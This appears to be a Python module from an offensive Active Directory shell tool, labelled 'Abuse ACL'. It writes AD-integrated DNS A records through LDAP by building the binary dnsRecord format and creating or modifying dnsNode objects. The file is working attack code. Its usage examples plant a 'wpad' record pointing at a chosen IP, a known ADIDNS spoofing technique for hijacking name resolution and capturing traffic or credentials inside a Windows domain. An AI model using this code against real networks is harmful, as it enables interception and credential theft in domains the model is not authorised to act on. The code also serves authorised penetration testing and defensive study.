import logging
import socket
import struct
from typing import Optional

from ldap3 import MODIFY_ADD, Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule, arg_field
from ldap_shell.utils.ldap_utils import LdapUtils

DNS_TYPE_A = 1
RANK_ZONE = 240


def pack_dns_a(ip: str, ttl: int = 180, serial: int = 1) -> bytes:
    """Pack an AD-integrated DNS A record ([MS-DNSP] 2.3.2.2)."""
    try:
        data = socket.inet_aton(ip)
    except OSError as exc:
        raise ValueError(f'Invalid IPv4 address: {ip}') from exc
    header = struct.pack('<HHBBHI', len(data), DNS_TYPE_A, 5, RANK_ZONE, 0, serial)
    header += struct.pack('>I', ttl)
    header += struct.pack('<II', 0, 0)
    return header + data


def unpack_dns_type(blob) -> Optional[int]:
    """Return the DNS type of a packed dnsRecord, or None if truncated."""
    if blob is None:
        return None
    raw = bytes(blob) if not isinstance(blob, bytes) else blob
    if len(raw) < 4:
        return None
    return struct.unpack_from('<H', raw, 2)[0]


class LdapShellModule(BaseLdapModule):
    """Add or delete an AD-integrated DNS node (A record)."""

    help_text = "Add or delete an ADIDNS A record (DomainDnsZones / ForestDnsZones)"
    examples_text = """
    `set_dns wpad add A 10.0.0.5`
    `set_dns wpad del`
    `set_dns wpad add A 10.0.0.5 domain.local`
    Inline: `ldap_shell domain.local/user:pass set_dns wpad add A 10.0.0.5`
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        name: str = arg_field(
            description="DNS node name (e.g. wpad)",
            arg_type=ArgumentType.STRING,
        )
        action: str = arg_field(
            description="Action: add or del",
            arg_type=ArgumentType.ACTION,
        )
        rtype: Optional[str] = arg_field(
            None,
            description="Record type (only A is supported)",
            arg_type=ArgumentType.STRING,
        )
        data: Optional[str] = arg_field(
            None,
            description="Record data (IPv4 for A)",
            arg_type=ArgumentType.STRING,
        )
        zone: Optional[str] = arg_field(
            None,
            description="DNS zone (default: current domain)",
            arg_type=ArgumentType.STRING,
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def _zone_name(self) -> str:
        return self.args.zone or LdapUtils.get_domain_name(self.domain_dumper.root)

    def _zone_bases(self, zone: str):
        root = self.domain_dumper.root
        return [
            f'DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{root}',
            f'DC={zone},CN=MicrosoftDNS,DC=ForestDnsZones,{root}',
        ]

    def _find_zone(self, zone: str) -> Optional[str]:
        for base in self._zone_bases(zone):
            if self.client.search(base, '(objectClass=dnsZone)', search_scope='BASE', attributes=['dc']):
                if self.client.entries:
                    return base
        return None

    def __call__(self):
        action = (self.args.action or '').lower()
        if action not in ('add', 'del'):
            self.log.error('Invalid action. Use add/del')
            return

        zone = self._zone_name()
        zone_dn = self._find_zone(zone)
        if not zone_dn:
            self.log.error(f'DNS zone not found: {zone}')
            return

        node_dn = f'DC={self.args.name},{zone_dn}'
        if action == 'del':
            if not self.client.delete(node_dn):
                self.log.error(f'Failed to delete {node_dn}: {self.client.result}')
                return
            self.log.info(f'Deleted DNS node {self.args.name} in {zone}')
            return

        rtype = (self.args.rtype or 'A').upper()
        if rtype != 'A':
            self.log.error('Only A records are supported')
            return
        if not self.args.data:
            self.log.error('IPv4 address is required for add')
            return
        try:
            record = pack_dns_a(self.args.data)
        except ValueError as exc:
            self.log.error(str(exc))
            return

        exists = self.client.search(node_dn, '(objectClass=dnsNode)', search_scope='BASE', attributes=['dnsRecord'])
        if exists and self.client.entries:
            if not self.client.modify(node_dn, {'dnsRecord': [(MODIFY_ADD, [record])]}):
                self.log.error(f'Failed to add record on {node_dn}: {self.client.result}')
                return
            self.log.info(f'Added A {self.args.data} to existing node {self.args.name}')
            return

        if not self.client.add(
            node_dn,
            ['top', 'dnsNode'],
            {'dc': self.args.name, 'dnsRecord': [record]},
        ):
            self.log.error(f'Failed to create {node_dn}: {self.client.result}')
            return
        self.log.info(f'Created DNS node {self.args.name} A {self.args.data} in {zone}')
